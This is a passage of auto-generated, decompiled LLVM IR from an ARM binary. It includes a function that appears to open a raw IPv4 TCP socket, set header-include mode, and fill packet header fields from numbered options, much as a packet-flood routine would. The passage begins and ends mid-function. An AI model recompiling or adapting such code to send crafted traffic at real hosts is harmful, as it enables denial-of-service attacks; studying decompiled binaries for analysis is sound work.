  %v1_ab14 = add i32 %v0_ab10, 4
  %v2_ab14 = inttoptr i32 %v1_ab14 to i16*
  %v3_ab14 = load i16, i16* %v2_ab14, align 2
  %v4_ab14 = zext i16 %v3_ab14 to i32
  store i32 %v4_ab14, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_ab1c = add i32 %v0_ab10, 6
  %v4_ab1c = inttoptr i32 %v3_ab1c to i16*
  store i16 0, i16* %v4_ab1c, align 2
  %v0_ab20 = load i32, i32* @r6, align 4
  store i32 %v0_ab20, i32* %r0.global-to-local, align 4
  %v4_ab24 = call i32 @function_cf44(i32 %v0_ab20, i32 %v0_ab10, i32 %v4_ab14, i32 %stack_var_-136.0.ph)
  %v5_ab24 = trunc i32 %v4_ab24 to i16
  store i32 %v4_ab24, i32* %r0.global-to-local, align 4
  %v3_ab28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab28, i32* %r2.global-to-local, align 4
  %v3_ab2c = mul i32 %v3_ab28, 32
  store i32 %v3_ab2c, i32* %r3.global-to-local, align 4
  %v0_ab30 = load i32, i32* @r5, align 4
  %v1_ab30 = add i32 %v0_ab30, 16
  %v2_ab30 = inttoptr i32 %v1_ab30 to i32*
  %v3_ab30 = load i32, i32* %v2_ab30, align 4
  %v5_ab34 = mul i32 %v3_ab28, 24
  store i32 %v5_ab34, i32* %r3.global-to-local, align 4
  %v1_ab38 = load i32, i32* @sb, align 4
  %v2_ab38 = add i32 %v1_ab38, %v5_ab34
  store i32 %v2_ab38, i32* @lr, align 4
  %v2_ab3c = add i32 %v2_ab38, 4
  %v3_ab3c = inttoptr i32 %v2_ab3c to i32*
  store i32 %v3_ab30, i32* %v3_ab3c, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ab44 = load i32, i32* @r8, align 4
  %v4_ab44 = add i32 %v3_ab44, 6
  %v5_ab44 = inttoptr i32 %v4_ab44 to i16*
  store i16 %v5_ab24, i16* %v5_ab44, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ab4c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab4c = trunc i32 %v0_ab4c to i16
  %v2_ab4c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab4c = load i32, i32* @sb, align 4
  %v4_ab4c = add i32 %v3_ab4c, %v2_ab4c
  %v5_ab4c = inttoptr i32 %v4_ab4c to i16*
  store i16 %v1_ab4c, i16* %v5_ab4c, align 2
  %v0_ab50 = load i32, i32* @r4, align 4
  %v1_ab50 = trunc i32 %v0_ab50 to i16
  %v2_ab50 = load i32, i32* @lr, align 4
  %v3_ab50 = add i32 %v2_ab50, 2
  %v4_ab50 = inttoptr i32 %v3_ab50 to i16*
  store i16 %v1_ab50, i16* %v4_ab50, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ab58 = load i32, i32* @r5, align 4
  store i32 %v0_ab58, i32* %r1.global-to-local, align 4
  store i32 %v3_a764, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_ab64 = load i32, i32* @lr, align 4
  %v0_ab68 = load i32, i32* %ip.global-to-local, align 4
  %v6_ab6c = call i32 @function_10d6c(i32 %v3_a764, i32 %v0_ab58, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_ab64, i32 %v0_ab68)
  %v3_ab70 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab70, i32* %r3.global-to-local, align 4
  %v1_ab74 = add i32 %v3_ab70, 1
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v1_ab78 = load i32, i32* @sl, align 4
  %v9_ab78 = icmp eq i32 %v1_ab74, %v1_ab78
  store i1 %v9_ab78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ab74, i32* %stack_var_-44, align 4
  %v6_ab80 = icmp slt i32 %v1_ab74, %v1_ab78
  br i1 %v6_ab80, label %dec_label_pc_aa04, label %dec_label_pc_a9f0

dec_label_pc_ab88:                                ; preds = %dec_label_pc_aa04
  %v1_ab88 = add i32 %v2_aa0c, 16
  %v2_ab88 = inttoptr i32 %v1_ab88 to i32*
  %v3_ab88 = load i32, i32* %v2_ab88, align 4
  store i32 %v3_ab88, i32* %r4.global-to-local, align 4
  %v0_ab8c = call i32 @function_e7dc()
  store i32 %v0_ab8c, i32* %r0.global-to-local, align 4
  %v3_ab90 = load i32, i32* %stack_var_-44, align 4
  %v5_ab98 = mul i32 %v3_ab90, 24
  %v0_ab9c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab9c = and i32 %v0_ab9c, 16711680
  store i32 %v1_ab9c, i32* %ip.global-to-local, align 4
  %v3_aba0 = udiv i32 %v0_ab9c, 16777216
  %v4_aba4 = udiv i32 %v1_ab9c, 256
  %v5_aba4 = or i32 %v4_aba4, %v3_aba0
  store i32 %v5_aba4, i32* %r2.global-to-local, align 4
  %v1_aba8 = load i32, i32* @sb, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_ab98
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  %v1_abac = and i32 %v0_ab9c, 65280
  store i32 %v1_abac, i32* %r3.global-to-local, align 4
  %v1_abb0 = add i32 %v2_aba8, 20
  %v2_abb0 = inttoptr i32 %v1_abb0 to i8*
  %v3_abb0 = load i8, i8* %v2_abb0, align 1
  %v4_abb0 = zext i8 %v3_abb0 to i32
  store i32 %v4_abb0, i32* %ip.global-to-local, align 4
  %v5_abb8 = call i32 @llvm.bswap.i32(i32 %v0_ab9c)
  %v7_abbc = lshr i32 %v0_ab8c, %v4_abb0
  %v8_abbc = add i32 %v7_abbc, %v5_abb8
  store i32 %v8_abbc, i32* %r2.global-to-local, align 4
  %v1_abc0 = and i32 %v8_abbc, 16711680
  store i32 %v1_abc0, i32* %r0.global-to-local, align 4
  store i32 %v5_a750, i32* %r1.global-to-local, align 4
  %v5_abd8 = call i32 @llvm.bswap.i32(i32 %v8_abbc)
  store i32 %v5_abd8, i32* %r3.global-to-local, align 4
  store i1 %v7_aa34, i1* %cpsr_z.global-to-local, align 1
  %v1_abe0 = load i32, i32* @r5, align 4
  %v2_abe0 = add i32 %v1_abe0, 16
  %v3_abe0 = inttoptr i32 %v2_abe0 to i32*
  store i32 %v5_abd8, i32* %v3_abe0, align 4
  br i1 %v2_aa34, label %dec_label_pc_abe8, label %dec_label_pc_aa3c

dec_label_pc_abe8:                                ; preds = %dec_label_pc_ab88, %dec_label_pc_aa30
  %v0_abe8 = call i32 @function_e7dc()
  store i32 %v0_abe8, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_abf4 = load i32, i32* @fp, align 4
  %v9_abf4 = icmp eq i32 %v0_abf4, 65535
  store i1 %v9_abf4, i1* %cpsr_z.global-to-local, align 1
  %v1_abf8 = load i32, i32* @r5, align 4
  %v2_abf8 = add i32 %v1_abf8, 12
  %v3_abf8 = inttoptr i32 %v2_abf8 to i32*
  store i32 %v0_abe8, i32* %v3_abf8, align 4
  br i1 %v9_abf4, label %dec_label_pc_ac00, label %dec_label_pc_abe8.dec_label_pc_aa4c_crit_edge

dec_label_pc_abe8.dec_label_pc_aa4c_crit_edge:    ; preds = %dec_label_pc_abe8
  %v1_aa50.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa4c

dec_label_pc_ac00:                                ; preds = %dec_label_pc_abe8, %dec_label_pc_aa3c
  %v0_ac00 = call i32 @function_e7dc()
  %v3_ac08 = urem i32 %v0_ac00, 65536
  store i32 %v3_ac08, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_ac14 = sub nsw i32 999, %v3_ac08
  store i32 %v1_ac14, i32* %r3.global-to-local, align 4
  %v1_ac18 = load i32, i32* %r4.global-to-local, align 4
  %v9_ac18 = icmp eq i32 %v3_a7b0, %v1_ac18
  store i1 %v9_ac18, i1* %cpsr_z.global-to-local, align 1
  %v1_ac1c = trunc i32 %v0_ac00 to i16
  %v2_ac1c = load i32, i32* @r5, align 4
  %v3_ac1c = add i32 %v2_ac1c, 4
  %v4_ac1c = inttoptr i32 %v3_ac1c to i16*
  store i16 %v1_ac1c, i16* %v4_ac1c, align 2
  %v0_ac20 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac20 = trunc i32 %v0_ac20 to i16
  %v2_ac20 = load i32, i32* @r6, align 4
  %v3_ac20 = add i32 %v2_ac20, 4
  %v4_ac20 = inttoptr i32 %v3_ac20 to i16*
  store i16 %v1_ac20, i16* %v4_ac20, align 2
  br i1 %v9_ac18, label %dec_label_pc_ac28, label %dec_label_pc_ac00.dec_label_pc_aa58_crit_edge

dec_label_pc_ac00.dec_label_pc_aa58_crit_edge:    ; preds = %dec_label_pc_ac00
  %v1_aa5c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa58

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ac00, %dec_label_pc_aa4c
  %v0_ac28 = call i32 @function_e7dc()
  %v1_ac28 = trunc i32 %v0_ac28 to i16
  store i32 %v0_ac28, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b4, i32* %r3.global-to-local, align 4
  %v1_ac30 = load i32, i32* %r4.global-to-local, align 4
  %v9_ac30 = icmp eq i32 %v3_a7b4, %v1_ac30
  store i1 %v9_ac30, i1* %cpsr_z.global-to-local, align 1
  %v3_ac34 = load i32, i32* @r5, align 4
  %v4_ac34 = add i32 %v3_ac34, 58
  %v5_ac34 = inttoptr i32 %v4_ac34 to i16*
  store i16 %v1_ac28, i16* %v5_ac34, align 2
  br i1 %v9_ac30, label %dec_label_pc_ac3c, label %dec_label_pc_aa64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac28, %dec_label_pc_aa58
  %v0_ac3c = call i32 @function_e7dc()
  %v1_ac3c = trunc i32 %v0_ac3c to i16
  store i32 %v0_ac3c, i32* %r0.global-to-local, align 4
  store i32 %v1_a7a8, i32* @r4, align 4
  store i1 %v2_ac44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ac44, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_ac3c
  %v3_ac4c32 = load i32, i32* @r8, align 4
  %v4_ac4c33 = add i32 %v3_ac4c32, 2
  %v5_ac4c34 = inttoptr i32 %v4_ac4c33 to i16*
  store i16 %v1_ac3c, i16* %v5_ac4c34, align 2
  br label %dec_label_pc_ac58

bb88:                                             ; preds = %dec_label_pc_ac3c
  %v1_ac48 = load i32, i32* @r5, align 4
  %v2_ac48 = add i32 %v1_ac48, 16
  %v3_ac48 = inttoptr i32 %v2_ac48 to i32*
  %v4_ac48 = load i32, i32* %v3_ac48, align 4
  store i32 %v4_ac48, i32* %r3.global-to-local, align 4
  %v3_ac4c = load i32, i32* @r8, align 4
  %v4_ac4c = add i32 %v3_ac4c, 2
  %v5_ac4c = inttoptr i32 %v4_ac4c to i16*
  store i16 %v1_ac3c, i16* %v5_ac4c, align 2
  %v1_ac50 = load i32, i32* %r3.global-to-local, align 4
  %v2_ac50 = load i32, i32* @r6, align 4
  %v3_ac50 = add i32 %v2_ac50, 16
  %v4_ac50 = inttoptr i32 %v3_ac50 to i32*
  store i32 %v1_ac50, i32* %v4_ac50, align 4
  br label %dec_label_pc_aa78

dec_label_pc_ac58:                                ; preds = %.thread31, %dec_label_pc_aa64
  %v0_ac58 = call i32 @function_e7dc()
  store i32 %v0_ac58, i32* %r0.global-to-local, align 4
  %v1_ac5c = load i32, i32* @r6, align 4
  %v2_ac5c = add i32 %v1_ac5c, 16
  %v3_ac5c = inttoptr i32 %v2_ac5c to i32*
  store i32 %v0_ac58, i32* %v3_ac5c, align 4
  br label %dec_label_pc_aa78

dec_label_pc_ac64:                                ; preds = %dec_label_pc_aa78
  %v0_ac64 = load i32, i32* @r8, align 4
  %v1_ac64 = add i32 %v0_ac64, 8
  store i32 %v1_ac64, i32* %r0.global-to-local, align 4
  store i32 %v5_a6fc, i32* %r1.global-to-local, align 4
  %v2_ac6c = inttoptr i32 %v1_ac64 to i16*
  %v3_ac6c = call i32 @function_e9dc(i16* %v2_ac6c, i32 %v5_a6fc)
  store i32 %v3_ac6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aadc

dec_label_pc_ac74:                                ; preds = %dec_label_pc_a774
  store i32 %v3_a764, i32* %r0.global-to-local, align 4
  %v1_ac78 = call i32 @function_10608(i32 %v3_a764)
  store i32 %v1_ac78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ac7c

dec_label_pc_ac7c:                                ; preds = %dec_label_pc_a614, %dec_label_pc_ac74
  %v1_ac84 = phi i32 [ %v3_a764, %dec_label_pc_a614 ], [ %v1_ac78, %dec_label_pc_ac74 ]
  store i32 %v3_a614, i32* %r4.global-to-local, align 4
  store i32 %v6_a614, i32* %r5.global-to-local, align 4
  store i32 %v24_a614, i32* %fp.global-to-local, align 4
  ret i32 %v1_ac84

dec_label_pc_ac88:                                ; preds = %dec_label_pc_a79c
  %v1_ac90 = add i32 %v5_a6fc, 8
  store i32 %v1_ac90, i32* %r1.global-to-local, align 4
  %v1_ac94 = add i32 %v5_a6fc, 66
  store i32 %v1_ac94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a9f0.preheader

; uselistorder directives
  uselistorder i32 %v1_ac94, { 1, 0 }
  uselistorder i32 %v1_ac90, { 1, 0 }
  uselistorder i16 %v1_ac3c, { 1, 0 }
  uselistorder i32 %v0_ac3c, { 1, 0 }
  uselistorder i32 %v0_ac28, { 1, 0 }
  uselistorder i32 %v3_ac08, { 1, 0 }
  uselistorder i32 %v0_ac00, { 1, 0 }
  uselistorder i32 %v5_abd8, { 1, 0 }
  uselistorder i32 %v0_ab9c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ab78, { 1, 2, 0 }
  uselistorder i32 %v1_ab74, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ab28, { 1, 0, 2 }
  uselistorder i32 %v4_ab24, { 1, 0 }
  uselistorder i32 %v0_ab10, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ab04, { 1, 0 }
  uselistorder i32 %v7_aa18, { 2, 1, 0, 3 }
  uselistorder i1 %v7_aa34, { 2, 1, 0 }
  uselistorder i1 %v2_ac44, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a988, { 1, 0, 2 }
  uselistorder i32 %v3_a804, { 1, 0 }
  uselistorder i32 %v3_a7e8, { 1, 2, 0 }
  uselistorder i32 %v1_a7e4, { 1, 0 }
  uselistorder i32 %v1_a7a8, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_a7a4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a7a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a79c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a794, { 1, 0 }
  uselistorder i1 %v7_a768, { 1, 0 }
  uselistorder i32 %v3_a764, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a750, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_a71c, { 1, 2, 0 }
  uselistorder i32 %v5_a6fc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a6b0, { 1, 0 }
  uselistorder i32 %v1_a68c, { 2, 1, 0 }
  uselistorder i32 %v5_a684, { 1, 0 }
  uselistorder i8 %v5_a668, { 0, 2, 1 }
  uselistorder i32 %v6_a648, { 1, 0 }
  uselistorder i32 %v2_a630, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 39, { 0, 1, 5, 2, 6, 3, 7, 4 }
  uselistorder i32 38, { 3, 4, 5, 6, 0, 7, 1, 8, 2, 9 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac7c, { 1, 0 }
  uselistorder label %dec_label_pc_aadc, { 1, 0 }
  uselistorder label %dec_label_pc_aa78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9f0.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_aca8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_aca8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_aca8 = load i32, i32* @r4, align 4
  %v6_aca8 = load i32, i32* @r5, align 4
  %v24_aca8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_acc4 = call i32 @function_11958(i32 %arg1, i32 4)
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_acd8 = load i32, i32* @r4, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @function_a300(i32 %v0_acd8, i32* %v5_acdc, i32 2, i32 0)
  %v1_ace8 = urem i32 %v6_acdc, 256
  store i32 %v1_ace8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r5, align 4
  store i32 %v0_acf4, i32* %r1.global-to-local, align 4
  %v0_acf8 = load i32, i32* @r4, align 4
  %v5_acfc = trunc i32 %v6_acdc to i8
  %v6_ad00 = inttoptr i32 %v0_acf4 to i32*
  %v7_ad00 = call i32 @function_a300(i32 %v0_acf8, i32* %v6_ad00, i32 3, i32 65535)
  %v0_ad04 = load i32, i32* @r5, align 4
  store i32 %v0_ad04, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ad00, i32* %fp.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  %v4_ad18 = inttoptr i32 %v0_ad04 to i32*
  %v5_ad18 = call i32 @function_a300(i32 %v0_ad14, i32* %v4_ad18, i32 4, i32 64)
  %v1_ad20 = urem i32 %v5_ad18, 256
  store i32 %v1_ad20, i32* %ip.global-to-local, align 4
  %v0_ad24 = load i32, i32* @r5, align 4
  store i32 %v0_ad24, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  %v6_ad38 = inttoptr i32 %v0_ad24 to i32*
  %v7_ad38 = call i32 @function_a300(i32 %v0_ad30, i32* %v6_ad38, i32 5, i32 1)
  %v1_ad44 = urem i32 %v7_ad38, 256
  store i32 %v1_ad44, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ad50 = load i32, i32* @r5, align 4
  store i32 %v0_ad50, i32* %r1.global-to-local, align 4
  %v0_ad54 = load i32, i32* @r4, align 4
  %v5_ad5c = inttoptr i32 %v0_ad50 to i32*
  %v6_ad5c = call i32 @function_a300(i32 %v0_ad54, i32* %v5_ad5c, i32 6, i32 65535)
  %v0_ad64 = load i32, i32* @r5, align 4
  store i32 %v0_ad64, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_ad5c, i32* @r8, align 4
  %v0_ad74 = load i32, i32* @r4, align 4
  %v4_ad78 = inttoptr i32 %v0_ad64 to i32*
  %v5_ad78 = call i32 @function_a300(i32 %v0_ad74, i32* %v4_ad78, i32 7, i32 65535)
  %v0_ad7c = load i32, i32* @r5, align 4
  store i32 %v0_ad7c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_ad78, i32* @r7, align 4
  %v0_ad8c = load i32, i32* @r4, align 4
  %v4_ad90 = inttoptr i32 %v0_ad7c to i32*
  %v5_ad90 = call i32 @function_a300(i32 %v0_ad8c, i32* %v4_ad90, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ada0 = load i32, i32* @r5, align 4
  store i32 %v0_ada0, i32* %r1.global-to-local, align 4
  %v0_ada4 = load i32, i32* @r4, align 4
  %v4_ada8 = inttoptr i32 %v0_ada0 to i32*
  %v5_ada8 = call i32 @function_a300(i32 %v0_ada4, i32* %v4_ada8, i32 1, i32 1)
  %v1_adb0 = urem i32 %v5_ada8, 256
  store i32 %v1_adb0, i32* %ip.global-to-local, align 4
  %v0_adb4 = load i32, i32* @r5, align 4
  store i32 %v0_adb4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_adc0 = load i32, i32* @r4, align 4
  %v5_adc8 = inttoptr i32 %v0_adb4 to i32*
  %v6_adc8 = call i32 @function_a300(i32 %v0_adc0, i32* %v5_adc8, i32 19, i32 0)
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r1.global-to-local, align 4
  %v2_add4 = load i32, i32* @global_var_20600.75, align 4
  store i32 %v2_add4, i32* %r3.global-to-local, align 4
  store i32 %v6_adc8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_ade0 = load i32, i32* @r4, align 4
  %v4_ade4 = inttoptr i32 %v0_add0 to i32*
  %v5_ade4 = call i32 @function_a300(i32 %v0_ade0, i32* %v4_ade4, i32 25, i32 %v2_add4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_adf8 = call i32 @function_10df0(i32 2, i32 3, i32 6)
  %v7_adfc = icmp eq i32 %v3_adf8, -1
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_adfc, label %dec_label_pc_b29c, label %dec_label_pc_ae08

dec_label_pc_ae08:                                ; preds = %dec_label_pc_aca8
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ae10 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ae10, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ae24 = call i32 @function_10dac(i32 %v3_adf8, i32 0, i32 3, i32 %v6_ae10, i32 4)
  %v7_ae28 = icmp eq i32 %v5_ae24, -1
  store i1 %v7_ae28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ae28, label %dec_label_pc_b294, label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %dec_label_pc_ae08
  %v0_ae30 = load i32, i32* @r8, align 4
  %v0_ae34 = load i32, i32* @r7, align 4
  %v0_ae38 = load i32, i32* %fp.global-to-local, align 4
  %v0_ae3c = load i32, i32* @r6, align 4
  %v1_ae3c = urem i32 %v0_ae3c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ae44 = urem i32 %v0_ae30, 65536
  store i32 %v3_ae44, i32* %r3.global-to-local, align 4
  %v3_ae48 = urem i32 %v0_ae34, 65536
  store i32 %v3_ae48, i32* %r4.global-to-local, align 4
  %v0_ae4c = load i32, i32* @sl, align 4
  %v2_ae4c = icmp eq i32 %v0_ae4c, 0
  store i1 %v2_ae4c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ae64 = urem i32 %v0_ae38, 65536
  store i32 %v3_ae64, i32* @fp, align 4
  br i1 %v2_ae4c, label %dec_label_pc_b2a8, label %dec_label_pc_ae74

dec_label_pc_ae74:                                ; preds = %dec_label_pc_ae30
  %v3_ae34 = mul i32 %v0_ae34, 65536
  %v3_ae30 = mul i32 %v0_ae30, 65536
  %v0_ae38.not = or i32 %v0_ae38, -65536
  %v1_ae78 = xor i32 %v0_ae38.not, 65535
  %v3_ae7c = mul i32 %v5_ad90, 65536
  %v1_ae80 = add i32 %v3_ae7c, 3407872
  %tmp67 = udiv i32 %v1_ae80, 256
  %v3_ae94 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_ae78, 256
  %v3_ae98 = and i32 %tmp68, 65280
  store i32 %v3_ae98, i32* %ip.global-to-local, align 4
  %v1_ae9c = add i32 %v3_ae7c, 524288
  %v1_aea4 = add i32 %v3_ae7c, 1835008
  %tmp69 = udiv i32 %v1_ae78, 256
  %v4_aea8 = urem i32 %tmp69, 256
  %v5_aea8 = or i32 %v4_aea8, %v3_ae98
  %v4_aeb0 = udiv i32 %v1_ae80, 16777216
  %v5_aeb0 = or i32 %v3_ae94, %v4_aeb0
  store i32 %v5_aeb0, i32* @r8, align 4
  %v3_aebc = udiv i32 %v1_aea4, 256
  %tmp70 = mul i32 %v0_ae38, 256
  %v3_aec0 = and i32 %tmp70, 65280
  store i32 %v3_ae30, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_ae38, 256
  %v4_aed0 = urem i32 %tmp71, 256
  %v5_aed0 = or i32 %v4_aed0, %v3_aec0
  %tmp72 = mul i32 %v0_ae30, 256
  %v3_aed4 = and i32 %tmp72, 65280
  %v1_aed8 = and i32 %v3_aebc, 65280
  store i32 %v1_aed8, i32* @r6, align 4
  store i32 %v3_ae34, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_ae34, 256
  %v3_aee4 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_ae30, 256
  %v4_aee8 = urem i32 %tmp74, 256
  %v5_aee8 = or i32 %v4_aee8, %v3_aed4
  store i32 %v5_aee8, i32* @lr, align 4
  %v4_aeec = udiv i32 %v1_aea4, 16777216
  %v5_aeec = or i32 %v1_aed8, %v4_aeec
  store i32 %v5_aeec, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_ae34, 256
  %v4_aef0 = urem i32 %tmp75, 256
  %v5_aef0 = or i32 %v4_aef0, %v3_aee4
  %tmp76 = udiv i32 %v1_ae9c, 256
  %v3_aef4 = and i32 %tmp76, 65280
  store i32 %v3_aef4, i32* @r5, align 4
  %v4_af08 = udiv i32 %v1_ae9c, 16777216
  %v5_af08 = or i32 %v3_aef4, %v4_af08
  store i32 %v5_af08, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_af5c = sext i8 %v5_acfc to i32
  %sext12 = mul nuw i32 %v5_aed0, 65536
  %v4_af7413 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_aeec, 65536
  %v4_afd8 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_aea8, 65536
  %v4_afdc = sdiv i32 %sext9, 65536
  %v1_afe4 = trunc i32 %v4_afd8 to i16
  %v2_b00c = icmp eq i32 %v1_ae3c, 0
  %sext10 = mul nuw i32 %v5_aee8, 65536
  %v4_b02c = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_aef0, 65536
  %v4_b034 = sdiv i32 %sext11, 65536
  %v1_af6c = trunc i32 %v5_ad18 to i8
  br label %dec_label_pc_af10

dec_label_pc_af10:                                ; preds = %bb82, %dec_label_pc_ae74
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_af1c = call i32 @function_11958(i32 1510, i32 4)
  store i32 %v2_acc4, i32* %r2.global-to-local, align 4
  %v3_af24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_af24, i32* %r3.global-to-local, align 4
  %v2_af28 = load i32, i32* @r4, align 4
